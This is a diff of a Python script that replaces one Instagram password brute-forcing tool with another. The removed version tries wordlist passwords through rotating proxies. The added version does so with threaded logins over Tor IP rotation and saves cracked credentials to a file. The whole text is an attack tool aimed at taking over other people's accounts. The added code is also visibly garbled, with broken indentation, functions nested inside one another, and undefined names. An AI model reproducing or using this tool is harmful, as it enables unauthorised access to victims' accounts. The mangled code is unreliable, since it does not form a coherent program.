@@ -1,166 +1,204 @@
-'''
-TODO LIST:
-	Fix and make proxy function better
-	Sort code again
-	Add help function to all "Yes/no" questions
-	Add help  function to "Press enter to exit input"
-'''
-import requests
-import json
-import time
 import os
-import random
-import sys
+import time
+import urllib
+import argparse
+import threading
+import subprocess
+from platform import platform
+from Core.tor import TorManager
+from Core.Browser import Browser
 
-#Help function
-def Input(text):
-	value = ''
-	if sys.version_info.major > 2:
-		value = input(text)
-	else:
-		value = raw_input(text)
-	return str(value)
+#================================================
 
-#The main class
-class Instabrute():
-	def __init__(self, username, passwordsFile='pass.txt'):
+class Instagram(TorManager,Browser):
+	def __init__(self,username,passwordsFile='pass.txt'):
 		self.username = username
-		self.CurrentProxy = ''
-		self.UsedProxys = []
-		self.passwordsFile = passwordsFile
+		self.passwordsFile = wordlist
+		self.lock = threading.Lock()
 		
-		#Check if passwords file exists
-		self.loadPasswords()
-		#Check if username exists
-		self.IsUserExists()
+		self.ip = None
+		self.tries = 0
+		self.wait = False
+		self.alive = True
+		self.isFound = False
 
+		self.passlist = []
+		self.recentIps = []
+		
+		#for browser
+		self.url = 'https://www.instagram.com/accounts/login/?force_classic_login'
+		self.form1 = 'username'
+		self.form2 = 'password'
 
-		UsePorxy = Input('[*] Do you want to use proxy (y/n): ').upper()
-		if (UsePorxy == 'Y' or UsePorxy == 'YES'):
-			self.randomProxy()
+		Browser.__init__(self)
+		TorManager.__init__(self)
 
-
-	#Check if password file exists and check if he contain passwords
-	def loadPasswords(self):
-		if os.path.isfile(self.passwordsFile):
-			with open(self.passwordsFile) as f:
-				self.passwords = f.read().splitlines()
-				passwordsNumber = len(self.passwords)
-				if (passwordsNumber > 0):
-					print ('[*] %s Passwords loads successfully' % passwordsNumber)
-				else:
-					print('Password file are empty, Please add passwords to it.')
-					Input('[*] Press enter to exit')
-					exit()
-		else:
-			print ('Please create passwords file named "%s"' % self.passwordsFile)
-			Input('[*] Press enter to exit')
-			exit()
-
-	#Choose random proxy from proxys file
-	def randomProxy(self):
-		plist = open('proxy.txt').read().splitlines()
-		proxy = random.choice(plist)
-
-		if not proxy in self.UsedProxys:
-			self.CurrentProxy = proxy
-			self.UsedProxys.append(proxy)
+		self.n = '\033[0m'
+		self.r = '\033[31m'
+		self.g = '\033[32m'
+		self.y = '\033[33m'
+		self.b = '\033[34m'
+		
+		def kill(self,msg=None):
+		self.alive = False
+		self.stopTor()
 		try:
-			print('')
-			print('[*] Check new ip...')
-			print ('[*] Your public ip: %s' % requests.get('http://myexternalip.com/raw', proxies={ "http": proxy, "https": proxy },timeout=10.0).text)
-		except Exception as e:
-			print  ('[*] Can\'t reach proxy "%s"' % proxy)
-		print('')
+			if self.isFound:
+				self.display(msg)
+				print ' [-] Password Found!'
 
+				with open('Cracked.txt','a') as f:
+					f.write('[-] Username: {}\n[-] Password: {}\n\n'.\
+					format(self.username,msg))
 
-	#Check if username exists in instagram server
-	def IsUserExists(self):
-		r = requests.get('https://www.instagram.com/%s/?__a=1' % self.username) 
-		if (r.status_code == 404):
-			print ('[*] User named "%s" not found' % username)
-			Input('[*] Press enter to exit')
-			exit()
-		elif (r.status_code == 200):
-			return True
+			    if all([not self.isFound, msg]):
+			    	print '\n [-] {}'.format(msg)
+			    finally:exit()
 
-	#Try to login with password
-	def Login(self, password):
-		sess = requests.Session()
-
-		if len(self.CurrentProxy) > 0:
-			sess.proxies = { "http": self.CurrentProxy, "https": self.CurrentProxy }
-
-		#build requests headers
-		sess.cookies.update ({'sessionid' : '', 'mid' : '', 'ig_pr' : '1', 'ig_vw' : '1920', 'csrftoken' : '',  's_network' : '', 'ds_user_id' : ''})
-		sess.headers.update({
-			'UserAgent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.99 Safari/537.36',
-			'x-instagram-ajax':'1',
-			'X-Requested-With': 'XMLHttpRequest',
-			'origin': 'https://www.instagram.com',
-			'ContentType' : 'application/x-www-form-urlencoded',
-			'Connection': 'keep-alive',
-			'Accept': '*/*',
-			'Referer': 'https://www.instagram.com',
-			'authority': 'www.instagram.com',
-			'Host' : 'www.instagram.com',
-			'Accept-Language' : 'en-US;q=0.6,en;q=0.4',
-			'Accept-Encoding' : 'gzip, deflate'
-		})
-
-		#Update token after enter to the site
-		r = sess.get('https://www.instagram.com/') 
-		sess.headers.update({'X-CSRFToken' : r.cookies.get_dict()['csrftoken']})
-
-		#Update token after login to the site 
-		r = sess.post('https://www.instagram.com/accounts/login/ajax/', data={'username':self.username, 'password':password}, allow_redirects=True)
-		sess.headers.update({'X-CSRFToken' : r.cookies.get_dict()['csrftoken']})
+			def modifylist(self):
+				if len(self.recentIps) == 5:
+			del self.recentIps[0] 
 		
-		#parse response
-		data = json.loads(r.text)
-		if (data['status'] == 'fail'):
-			print (data['message'])
+		# failsafe
+			if len(self.recentIps) > 5:
+				while all([len(self.recentIps) > 4]):
+					del self.recentIps[0]
+		def manageIps(self,rec=2):
+			ip = self.getIp()
+			if ip:
+				if ip in self.recentIps:
+					self.updateIp()
+					self.manageIps()
+					self.ip = ip
+					self.recentIps.append(ip)
+			    else:
+			    	if rec:
+			    		self.updateIp()
+			    		self.manageIps(rec-1)
+			    	else:
+			    		self.connectionHandler()
 
-			UsePorxy = Input('[*] Do you want to use proxy (y/n): ').upper()
-			if (UsePorxy == 'Y' or UsePorxy == 'YES'):
-				print ('[$] Try to use proxy after fail.')
-				randomProxy() #Check that, may contain bugs
-			return False
+			    def changeIp(self):
+			    	self.createBrowser()
+			    	self.updateIp()
 
-		#return session if password is correct 
-		if (data['authenticated'] == True):
-			return sess 
-		else:
-			return False
+			    	self.manageIps()
+			    	self.modifylist()
+			    	self.deleteBrowser()
 
+			def setupPasswords(self):
+				with open(self.passwordsFile,'r') as passwords:
+					for pwd in passwords:
+						pwd = pwd.replace('\n','')
+						if len(self.passlist) < 5:
+							self.passlist.append(pwd)
+						else:
+							while all([self.alive,len(self.passlist)]):pass
+							if not len(self.passlist):
+							self.passlist.append(pwd)
+							
+							# done reading files
+			while self.alive:
+				if not len(self.passlist):
+					self.alive = False
 
+			def connectionHandler(self):
+				if self.wait:return
+				self.wait = True
+				print ' [-] Waiting For Connection {}...{}'.format(self.g,self.n)
+				while all([self.alive,self.wait]):
+					try:
+						self.updateIp()
+						urllib.urlopen('https://wtfismyip.com/text')
+						self.wait = False
+						break
+					except IOError:
+						time.sleep(1.5)
+						self.manageIps()
 
+					def attempt(self,pwd):
+						with self.lock:
+							self.tries+=1
+							self.createBrowser()
+							html = self.login(pwd)
+							self.deleteBrowser()
 
+					if html:
+						if all([not self.form1 in html,not self.form2 in html]):
+							self.isFound = True
+							self.kill(pwd)
+						  del self.passlist[self.passlist.index(pwd)]
 
+				def run(self):
+					self.display()
+					time.sleep(1.3)
+					threading.Thread(target=self.setupPasswords).start()
+					while self.alive:
+						bot = None
 
-instabrute = Instabrute(Input('Please enter a username: '))
+					for pwd in self.passlist:
+						bot = threading.Thread(target=self.attempt,args=[pwd])
+						bot.start()
 
-try:
-	delayLoop = int(Input('[*] Please add delay between the bruteforce action (in seconds): ')) 
-except Exception as e:
-	print ('[*] Error, software use the defult value "4"')
-	delayLoop = 4
-print ('')
+						# wait for bot
+					if bot:
+						while all([self.alive,bot.is_alive()]):pass
+						if self.alive:
+							self.changeIp()
 
+					def display(self,pwd=None):
+						pwd = pwd if pwd else ''
+						ip = self.ip if self.ip else ''
+						creds = self.r if not self.isFound else self.g
+						attempts = self.tries if self.tries else ''
 
+						subprocess.call(['clear'])
+						print ''
+						print ' +------- Instagram -------+'
+						print ' [-] Username: {}{}{}'.format(creds,self.username.title(),self.n)
+						print ' [-] Password: {}{}{}'.format(creds,pwd,self.n)
+						print ' [-] Proxy IP: {}{}{}'.format(self.b,ip,self.n)
+						print ' [-] Attempts: {}{}{}'.format(self.y,attempts,self.n)
+						print ''
 
-for password in instabrute.passwords:
-	sess = instabrute.Login(password)
-	if sess:
-		print ('[*] Login success %s' % [instabrute.username,password])
-	else:
-		print ('[*] Password incorrect [%s]' % password)
+						if not ip:
+							print ' [-] Obtaining Proxy IP {}...{}'.format(self.g,self.n)
+							self.changeIp()
+							time.sleep(1.3)
+							self.display()
+				def main():
+					# assign arugments
+					args = argparse.ArgumentParser()
+					args.add_argument('username',help='Email or username')
+					args.add_argument('passwordsFile',help='passwordsFile')
+					args =  args.parse_args()
 
-	try:
-		time.sleep(delayLoop)
-	except KeyboardInterrupt:
-		WantToExit = str(Input('Type y/n to exit: ')).upper()
-		if (WantToExit == 'Y' or WantToExit == 'YES'):
-			exit()
-		else:
-			continue
+					# assign variables
+					engine = Instagram(args.username,args.passwordsFile)
+		
+		# does tor exists?
+					if not os.path.exists('/usr/bin/tor'):
+						try:engine,installTor()
+					except KeyboardInterrupt:engine.kill('Exiting {}...{}'.format(self.g,self.n))
+					if not os.path.exists('/usr/sbin/tor'):
+						engine.kill('Please Install Tor'.format(engine.y,engine.r,engine.n))
+
+				# does the account exists?
+				if not engine.exists(engine.username):
+					engine.kill('The Account \'{}\' does not exists'.format(engine.username.title()))
+
+				# start attack
+				try:
+					engine.run()
+				finally:
+					if not engine.isFound:
+						engine.kill('Exiting {}...{}'.format(engine.g,engine.n))
+
+			if __name__ == '__main__':
+				if not 'kali' in platform():
+					exit('Kali Linux required')
+
+			if os.getuid():
+				exit('root access required')
+			else:
+main()
